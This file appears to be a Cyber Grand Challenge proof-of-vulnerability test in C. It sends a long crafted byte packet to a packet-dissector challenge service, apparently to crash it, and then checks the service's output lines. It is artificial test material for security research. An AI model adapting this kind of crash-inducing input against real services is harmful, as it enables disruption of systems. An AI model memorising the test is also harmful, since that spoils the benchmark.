#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x01\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\xdd\xda\xfd\x11"
         "\xba\x35\x58\x4e\x4b\x80\x27\x43\x98\x00\x00\x00\x60\x73\x0b\x11"
         "\x0a\x83\x40\xba\xd8\xfc\xd1\xea\x3c\x73\xcf\x56\xdb\x6d\xcc\x72"
         "\xdd\x15\x0a\xda\x3c\x4e\xb0\x70\x46\xf7\x92\x93\x55\x57\x13\x45"
         "\x4d\x35\xe7\xa3\xbd\xd4\x45\x82\xd8\xa2\xba\xeb\x64\xc1\xef\x2f"
         "\x8d\x61\x56\x3b\x3d\x58\x00\x5b\xb4\xcc\x2a\x7a\xfa\xe3\xdc\xc3"
         "\x22\xcd\x88\x02\x4e\xc3\x9b\xac\x0e\x1d\xeb\x82\x87\xf1\xa2\xea"
         "\x42\xb6\x86\xee\xa1\xf3\xba\x79\xde\xeb\x1a\x6a\xa1\x16\xb7\x5f"
         "\x00\x65\xd1\xeb\x72\xbf\xd4\xc5\x18\x4b\x6e\x82\x15\x87\xd0\xa1"
         "\x11\xc6\x72\x9a\xde\x36\xb8\x7c\x5f\xf2\x3b\xf3\x62\x0a\xb3\x95"
         "\x2d\xab\xa1\xaf\x9e\xce\x25\x5f\x00\xd4\x6f\xac\xf6\x6c\x13\x5a"
         "\xd4\x27\xa0\x52\xab\x58\x9e\x83\x92\xda\x3b\x5a\x4f\x49\xa5\x5a"
         "\xb7\x7d\xcf\x68\x22\x13\x9c\x98\x59\xcd\x93\x9a\x32\x55\x6d\x89"
         "\x76\xf0\xf5\x12\x69\x21\x97\xab\xe8\x8a\xa4\x4a\xb0\x53\x80\x62"
         "\xd8\xac\x42\x5f\xb8\x4c\xb0\x17\x51\x67\x73\xce\xd0\x45\x99\xbb"
         "\xb0\x10\x04\x9d\xdf\x55\x15\xac\x9e\x5b\x24\x7d\xfc\x72\x5a\x4b"
         "\xee\x46\xe0\x17\xe4\xa5\xfd\x5d\x27\xac\x35\x38\x60\xdc\x36\x3e"
         "\x3a\xd6\x77\xb6\x0a\x83\xa0\x25\xa5\xf4\x7e\xef\x36\x4c\x22\xfe"
         "\x1d\x28\xd4\x5a\xe0\xc2\x61\x80\x65\xe4\x3a\x7f\xfe\x4b\x7d\xc8"
         "\x2b\x62\xd8\x3d\x44\xa1\xb4\x7e\x11\xf7\x48\x3b\x69\x85\x27\x51"
         "\xc1\x3d\xfc\xbf\x06\xcb\x0e\xca\x26\xb6\x4e\x63\x42\xc9\x20\x12"
         "\xfb\xfc\xbe\x3c\x94\xd1\x9a\xe6\xda\x12\x31\xc2\xd6\x3a\xae\x9c"
         "\xed\x1a\x69\x35\xa0\x83\x49\x14\x1c\x49\x90\x78\xb2\x92\x5a\x1b"
         "\xd0\xdc\x97\xac\xd7\x3f\xd2\xdf\x24\x3f\x54\x22\x93\x65\x5f\xd9"
         "\xb0\x61\xd1\xd1\x5f\x00\x62\x19\xa6\x29\x1e\x25\x54\xe5\x33\x5f"
         "\xa8\x05\x11\xe1\xb0\x9f\x3a\xac\x88\x24\x3b\x72\x2f\x47\xcc\xad"
         "\x49\x53\x9b\xec\xc2\x8a\x82\x32\x40\xe0\x3b\xb8\x39\x5f\x51\xeb"
         "\xa3\x84\x4c\x64\xd8\x7d\x29\x7c\x7d\xe0\x92\x2d\x73\x20\x00\x5d"
         "\xe4\xdd\x2d\x68\x8d\x83\xb1\x71\x89\xb0\xbe\x21\x3f\x4d\x0e\x0d"
         "\x12\x27\x4a\x61\x61\x0c\xf7\x31\x13\xdf\xbf\x0c\xcb\x09\xbd\xa8"
         "\x6a\x22\x94\xb4\xdd\xf9\x39\x5f\x7c\x2f\x17\x14\x3d\x41\x92\xb9"
         "\xcb\x01\xb3\xff\x3e\xab\x31\xda\x7f\xd4\x48\xaf\xe3\xca\x25\x2c"
         "\x9e\xe0\xbe\xcd\x52\x54\xe7\x64\xd2\x16\xeb\x58\x0f\x0d\x1c\x80"
         "\xab\x7f\x9d\xc9\x04\x93\x15\xa2\xfc\x0a\x57\x2d\x3f\x95\x37\x6a"
         "\xf4\xe3\x75\xb6\xb2\x63\x13\xfe\x36\x18\xfd\x0f\x6d\xe2\xa2\x8a"
         "\xf5\xa7\xab\xa6\xa2\x0b\xca\x66\x4c\xdd\xb2\x1d\x48\x00\x4f\xd6"
         "\xb5\xac\x7d\x7a\xc2\x5f\xf0\x7b\x25\x4d\x26\x40\x56\x80\x66\xde"
         "\xb7\x6c\x9d\x98\xb7\x64\x98\x3a\x2c\xaa\xec\xfe\xfa\x06\xd9\x71"
         "\xac\x63\x02\x57\x20\x02\xe9\xa5\x5a\x14\xd9\xf2\x32\x78\x2a\xb2"
         "\x34\x1f\xb1\x4a\x0f\xb2\x2d\x4c\x93\xf1\x97\x47\xec\x82\xaf\xc6"
         "\x98\x87\x7f\x6a\x2f\x98\x14\x08\xdb\x05\xe8\x35\xcf\x42\xab\x15"
         "\x6c\x10\x0a\x53\xd0\x19\x1d\x10\xcc\xfe\x76\xa0\x01\x89\x01\x4e"
         "\x08\x0a\x9e\xf1\xe6\x2e\x45\xc1\xa0\x57\x6f\xc1\xe2\x92\xfc\x89"
         "\x0f\xfb\x1b\xf5\xcb\x47\xf4\x00\x6e\x03\x9d\xf5\x10\x93\x95\x9d"
         "\x63\x82\x43\xed\x36\x6b\xc0\x40\x6b\xfb\x04\x34\x0d\xce\xd7\xe5"
         "\xd2\x4c\xb8\x3e\xff\x12\xb0\x18\x2d\xa3\x22\x83\x2c\x29\xa8\x9b"
         "\x03\x61\xfb\xeb\xeb\x0d\x21\x7b\xa2\xb1\x17\xba\x78\xa6\xce\x72"
         "\x95\xca\xbb\x83\x05\xaf\xe8\x04\xe8\x08\x19\xa0\xa1\x2f\x57\xce"
         "\xf3\x14\x33\x89\xfb\x53\x0a\x21\x89\xc9\xc9\x18\x28\x05\xb0\xf5"
         "\x40\x38\xba\xfd\x99\xde\xe0\xf8\xa0\x64\x5e\x52\xca\xd0\xe5\x99"
         "\xf4\x91\x42\x0e\x69\xb2\xee\xc0\xa3\x70\x86\x3c\x62\x78\x15\x1e"
         "\xbc\x37\x91\xd7\x08\xd9\xb1\x5f\x5b\x38\x0c\x08\x19\x2f\x1a\x3f"
         "\xa3\x61\x62\xc5\xda\xa8\x55\x54\x68\x30\x5f\x55\xa0\x59\x05\x8d"
         "\x93\xf2\x22\x33\x94\x27\xcc\x99\xae\xc7\x83\xb2\x9d\xd1\xdf\xd0"
         "\x3a\xc4\x4e\x37\x59\xe1\xc0\xf0\x3f\xd0\xbe\xdf\x25\xb3\x04\x5f"
         "\xce\x07\xb4\xb9\xc9\xe8\x88\x25\x33\x40\x2b\x81\x69\x67\x60\xe3"
         "\x8d\x1d\xcc\x9a\xce\x42\xd0\x86\x75\x67\x4b\x45\x87\x3a\xb0\x85"
         "\x76\x1a\x39\x22\x36\xee\x66\xef\xd1\x31\xc0\x66\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===lol
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6f\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===assentaneoushemal
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x61\x73\x73\x65\x6e\x74\x61\x6e\x65\x6f\x75"
         "\x73\x68\x65\x6d\x61\x6c";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
